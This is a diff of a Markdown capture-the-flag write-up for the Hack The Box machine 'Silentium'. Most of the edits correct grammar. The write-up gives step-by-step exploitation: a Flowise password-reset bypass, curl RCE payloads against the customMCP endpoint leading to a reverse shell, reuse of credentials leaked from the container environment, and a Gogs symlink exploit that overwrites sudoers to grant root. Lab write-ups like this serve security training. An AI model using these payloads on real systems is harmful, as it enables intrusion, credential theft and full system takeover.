@@ -34,20 +34,20 @@ Nmap done: 1 IP address (1 host up) scanned in 21.02 seconds
 ```
 
 - Found ports 22,80 
-- lets add the domain silentium.htb to /etc/hosts file 
+- Let's add the domain silentium.htb to /etc/hosts file 
 ```
 echo "10.129.56.69 silentium.htb" | sudo tee -a /etc/hosts 
 [sudo] password for light: 
 10.129.56.69 silentium.htb
 ```
 
-- now access the site in the browser http://silentium.htb
+- Now visit the site in the browser. http://silentium.htb
 
 ![port80](Data/silentium.png)
 
 ## Enumeration
 
-- I performed subdomain enumeration . and got a intresting subdomain.
+- I performed subdomain enumeration and found an interesting subdomain.
 
 ```
  ffuf -u http://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.silentium.htb" -fc 301
@@ -83,19 +83,19 @@ staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duratio
 echo "10.129.56.69 staging.silentium.htb" | sudo tee -a /etc/hosts
 ```
 - now visit the site http://staging.silentium.htb
-- we got a flowise login portal
+- We got a flowise login portal
 
 ![screenshot](Data/silentium2.png)
 
-- FlowiseAI Flowise is an open source low-code tool for developers to build customized large language model (LLM) applications and AI agents. 
-- After some research i found that flowise has a vulnerability [CVE-2026-41276](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-f6hc-c5jr-878p), that allows remote attackers to bypass authentication 
-- The vulnerability exisits in reset password . 
+- FlowiseAI Flowise is an open-source low-code tool for developers to build customized large language model (LLM) applications and AI agents. 
+- After some research, I found that Flowise has a vulnerability [CVE-2026-41276](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-f6hc-c5jr-878p), which allows remote attackers to bypass authentication 
+- The vulnerability exists in the reset password. 
 
-- But before that we need a valid email Id. I found the folloing names on the site
+- But before that, we need a valid email ID. I found the following names on the site
 
 ![screenshot](Data/silentium3.png) 
 
-- So i tried these emails in the rest password end point.
+- So I tried these emails in the rest password endpoint.
 
 ```
 marcusthorne@silentium.htb
@@ -105,29 +105,29 @@ ben@silentium.htb
 - **ben@silentium.htb** is the valid email.
 
 - Flowise allows users to reset forgotten passwords using a token emailed to the email address associated with their account. 
-- A token is sent to the user's email when a request is made to the "/api/v1/account/forgot-password" endpoint.
-- Users will submit this token along with their new password to the "/api/v1/account/reset-password" endpoint. and if it is submitted within sufficient time (15 minutes by default, or the value of the PASSWORD_RESET_TOKEN_EXPIRY_IN_MINUTES environment variable) the user will be able to change their password.
-- The resetPassword() method of the AccountService class is responsible for handling such requests. This method will first retrieve the account information of the user based on their email address, which includes the value of the reset token. 
+- A token is sent to the user's email when a request is made to the **"/api/v1/account/forgot-password"** endpoint.
+- Users will submit this token along with their new password to the **"/api/v1/account/reset-password"** endpoint. And if it is submitted within sufficient time (15 minutes by default, or the value of the PASSWORD_RESET_TOKEN_EXPIRY_IN_MINUTES environment variable), the user will be able to change their password.
+- The **resetPassword()** method of the AccountService class is responsible for handling such requests. This method will first retrieve the user's account information based on their email address, including the reset token value. 
 
-![screenshot](Data/silentium3.png)
+![screenshot](Data/silentium4.png)
 
-- The method will then check if the reset token provided matches the one stored in the user's account, and that the token hasn't expired, before changing that users password.
-- From the above screen shot we have the scret token just simply copy it to change bens password
+- The method will then check if the reset token provided matches the one stored in the user's account, and that the token hasn't expired, before changing that user's password.
+- From the above screenshot, we can retrieve the secret token. Simply copy it to change Ben's password.
 
 ![screenshot](Data/silentium5.png)
 
-- now login using the email and the new password.
-- After logged in i found the version of the flowise
+- Now, log in using the email and the new password.
+- After logging in, I found the version of the flowise
 
 ![screenshot](Data/silentium6.png)
 
 - On further research i found the the above version 3.0.5 is vulnerable to remote code execution [CVE-2025-59528](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
-- Well Flowise is used develop llm's and ai agents . there is a functionality allows users to input configuration settings for connecting to an external MCP (Model Context Protocol) server.
+- Well Flowise is used to develop llm's and AI agents. There is a functionality that allows users to input configuration settings for connecting to an external MCP (Model Context Protocol) server.
 - This can be achives by **/api/v1/node-load-method/customMCP** endpoint and the config is served via **mcpServerConfig** parameter.
 - inside the **convertToValidJSONString** function, user input is directly passed to the Function() constructor, which evaluates and executes the input as JavaScript code.
 - Since this runs with full node.js runtime privileges, we can access dangerous modules such as **child_process** and **fs**.
 
-## paylaod for RCE
+## payload for RCE
 
 ```
 curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
@@ -144,11 +144,12 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  
  ![screenshot](Data/silentium7.png)
 
- - first i tried to check weather the payload is working or not so i made simple curl request the web server i control.
+ - First, I tried to check whether the payload is working or not, so I made a simple curl request to the web server I control.
 
- ![screenshot](Data/silentium8.png)
+ ![screenshot](Data/silentum8.png)
 
- - as you can see we received a request . now lets get a revshell. 
+ - As you can see, we received a request. Now let's get a revshell.
+ - **Payload: **
  ```
 	curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 	  -H "Content-Type: application/json" \
@@ -165,7 +166,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 nc -lnvp 4444
 ```
 
-- Then run the above payload and bam we got the rev shell
+- Then run the above payload, and bam!, we got the rev shell
 
 ```
  nc -lnvp 4444                                                                      1m 3s
@@ -176,11 +177,11 @@ connect to [10.10.15.136] from (UNKNOWN) [10.129.56.184] 45237
 root
 / # 
 ```
-- We are landed insdie flowise Docker continer	
+- We are landed inside the Docker container.
 
-## Escaping docker 
+## Escaping Docker 
 
-- Firset this i did check for env and i found something intresting.
+- First thing I did was check for env, and I found something interesting.
 ```
 / # env
 FLOWISE_PASSWORD=F1l3_d0ck3r
@@ -214,17 +215,18 @@ SMTP_HOST=mailhog
 JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
 SMTP_USER=test
 ```
-- you can see the password **SMTP_PASSWORD=r04D!!_R4ge** . lets try to ssh using this password and ben as username.
+- you can see the password **SMTP_PASSWORD=r04D!!_R4ge** . Let's try to SSH using this password and ben as username.
 - with user creds **ben:r04D!!_R4ge** we succesfully logged in as ben user.
 
+## User.txt
 ```
 cat user.txt 
 a35cfb95b34ed2a6ec4ddf4178dfc61c
 ```
 
-## Privilage Escalation
+## Privilege Escalation
 
-- In the **/opt** I found a directory saying gogs.
+- In the **/opt** I found a directory called gogs.
 - gogs is a self-hosted Git service written in Go, designed for easy and fast software development hosting
 
 ```
@@ -288,28 +290,28 @@ DISABLE_GRAVATAR        = false
 ENABLE_FEDERATED_AVATAR = false
 ```
 
-- you can see from the config file it is running on port 3001 and domain staging-v2-code.dev.silentium.htb.
-- So to access this from our attacker machine . i performed ssh local port forwarding.
+- You can see from the config file that it is running on port 3001 and domain staging-v2-code.dev.silentium.htb.
+- So, to access this from our attacker machine. I performed SSH local port forwarding.
 - first add **staging-v2-code.dev.silentium.htb** to our /etc/hosts files .
 
 ```
  ssh -L 3001:staging-v2-code.dev.silentium.htb:3001 ben@staging-v2-code.dev.silentium.htb
 ```
-- now open browser on your attacker machine and navigate to the following url http://staging-v2-code.dev.silentium.htb/
+- Now open a browser on your attacker machine and navigate to the following URL: http://staging-v2-code.dev.silentium.htb/
 
 ![screenshot](Data/silentium9.png)
 
-- this application is vulnerable to [CVE-2025-8110](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit), is a vulnerability in Gogs that allows an authenticated user to achieve remote code execution by abusing symbolic links inside a Git repository.
+- This application is vulnerable to [CVE-2025-8110](https://www.wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit), a vulnerability in Gogs that allows an authenticated user to achieve remote code execution by abusing symbolic links inside a Git repository.
 
-- This CVE-2025-8110 is bypass for a patch for CVE-2024-55947
+- This CVE-2025-8110 is a bypass for a patch for CVE-2024-55947
 - The CVE-2024-55947 flaw abused a path traversal weakness in the **PutContents** API. It allowed an attacker to write files outside the git repository directory, granting the ability to overwrite sensitive system files or configuration files to achieve code execution. The maintainers addressed this by adding input validation on the path parameter.
 - The fix implemented for the CVE-2024-55947 did not account for symbolic links.
-- so an attacker commit a malicious symbloic link to overwrite files .  which can be levarage to remote code execution.
+- So an attacker commits a malicious symbolic link to overwrite files.  which can be leveraged to remote code execution.
 
 ### Step to Exploit CVE-2025-8110
 
-- register a new account and login.
-- create a new repository and git clone it to your attacker machine and execute the commands down below we are trying to overwrite sudoers.d file and give user Ben full powers. 
+- Register a new account and log in.
+- Create a new repository and git clone it to your attacker machine and execute the commands below. We are trying to overwrite the sudoers.d file and give user Ben full powers. 
 ```
   ~/HackTheBox/Silentium ❯ git clone http://staging-v2-code.dev.silentium.htb/spider/getroot.git     
 Cloning into 'getroot'...
@@ -360,10 +362,10 @@ To http://staging-v2-code.dev.silentium.htb/spider/getroot.git
  * [new branch]      master -> master
 
 ```
-- no we successfully commited our symlink now lets overwrite it . 
-- go to profile in the dashboard and applications create a new api token.
+- No, we successfully committed our symlink, now let's overwrite it. 
+- Go to profile in the dashboard, and applications, create a new api token.
 
-![screenshot](Data/silentium10.htb)
+![screenshot](Data/silentium10.png)
 ```
 curl -X PUT \
   -H "Authorization: token db82d95dfc444db1022eba68f143b0bc1df6d5f3" \
@@ -371,9 +373,9 @@ curl -X PUT \
   -d '{"message":"exploit","content":"YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxM"}' \
   "http://staging-v2-code.dev.silentium.htb/api/v1/repos/spider/getroot/contents/mysymlink"
   ```
- - The above command using **api/v1/repos/spider/getroot/contents/mysymlink** endpoint to update content of the symlink but it overwrites the sudoers file
+ - The above command uses the **api/v1/repos/spider/getroot/contents/mysymlink** endpoint to update the content of the symlink, but it overwrites the sudoers file
  - the content is base64 encoding of payload **ben ALL=(ALL) NOPASSWD: ALL**
- - and api token is sent via authorization header
+ - and api token is sent via the authorization header
 
  ```
  ben@silentium:~$ sudo -l
@@ -384,7 +386,9 @@ Matching Defaults entries for ben on silentium:
 User ben may run the following commands on silentium:
     (ALL) NOPASSWD: ALL
 ```
-- now you can see the sudoer file is succesfully overwritten.
+- Now you can see the sudoer file is successfully overwritten.
+
+## Root.txt
 
 ```
 ben@silentium:~$ sudo su
